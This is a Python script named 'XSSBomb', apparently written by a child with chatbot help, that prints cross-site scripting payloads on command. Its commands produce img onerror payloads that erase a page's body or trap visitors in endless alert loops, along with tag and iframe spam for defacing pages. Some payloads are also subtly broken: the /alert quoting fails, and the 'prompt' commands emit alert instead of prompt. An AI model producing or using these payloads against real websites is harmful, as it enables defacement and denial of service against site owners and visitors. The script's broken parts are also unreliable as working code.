import os

# Optional: only use color change on Windows
if os.name == "nt":
    os.system("color 4")

ascii_art = """
██╗  ██╗███████╗███████╗██████╗  ██████╗ ███╗   ███╗██████╗ 
╚██╗██╔╝██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
 ╚███╔╝ ███████╗███████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
 ██╔██╗ ╚════██║╚════██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
██╔╝ ██╗███████║███████║██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
"""

os.system("title XSSBomb")
print(ascii_art)
print("Type /help for list of commands")

while True:
    command = input("\n[user@tool_XSSBOMB]> ").strip()

    if command == "/help":
        print("/clearBody: javascript code that clears the body.")
        print("/addH1: add an input header to the site")
        print("/iframe: Adds a YouTube iframe link to the website")
        print("/nuke: Nukes the website with random h1s")
        print("/spam_h1: Spams h1 tags")
        print("/cecil: CECIL I NEED YOU CECIL")
        print("/alert: print an alert")
        print("/prompt: print a prompt")
        print("/alertnuke: looped alert script")
        print("/promptnuke: looped prompt script")
        print("/credits: Show Credits")
        print("/exit: Exit the program")

    elif command == "/clearBody":
        print('<img src="x" onerror="document.body.innerHTML = \'\';">')

    elif command == "/addH1":
        enter = input("Enter your H1 content: ")
        print(f'<h1>{enter}</h1>')

    elif command == "/iframe":
        input1 = input("Enter your YouTube URL: ")
        print(f'<iframe src="{input1}" height="200" width="300" title="Iframe Example"></iframe>')

    elif command == "/nuke":
        try:
            input2 = int(input("Enter how many h1s: "))
            input2_msg = input("Enter your message: ")
            input2_msg_tag = input("Enter your tag (needs closing): ")
            for i in range(input2):
                print(f'{input2_msg_tag}{input2_msg}{input2_msg_tag}')
        except ValueError:
            print("Invalid number entered.")

    elif command == "/spam_h1":
        try:
            input3 = int(input("How many h1 tags? > "))
            input3_msg = input("Message? > ")
            for i in range(input3):
                print(f'<h1>{input3_msg}</h1>')
        except ValueError:
            print("Invalid number entered.")

    elif command == "/cecil":
        for i in range(10):
            print(f'<iframe src="https://www.youtube.com/watch?v=kSSpBI-SagU" height="200" width="300" title="cecil"></iframe>')
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")
        print("Im vincing it")
        print("Im omning it")
        print("Im skibiding it")
        print("I NEED YOU CECIL")

    elif command == "/alert":
        alert_msg = input("enter message for alert: ")
        print(f'<img src="x" onerror="alert("{alert_msg}")">')

    elif command == "/prompt":
        prompt_msg = input("enter message for alert: ")
        print(f'<img src="x" onerror="alert("{prompt_msg}")">')

    elif command == "/alertnuke":
        nuke_msg = input("enter message for alert: ")
        print(f'''<img src="x" onerror="while (true) {{alert('{nuke_msg}')}};">''')

    elif command == "/promptnuke":
        promptnuke_msg = input("enter message for alert: ")
        print(f'''<img src="x" onerror="while (true) {{alert('{promptnuke_msg}')}};">''')


    elif command == "/credits":
        print("Made by: joakim age: 11")
        print("Help: chat gpt")

    elif command == "/exit":
        print("Exiting...")
        break

    else:
        print("Unknown command. Type /help for available options.")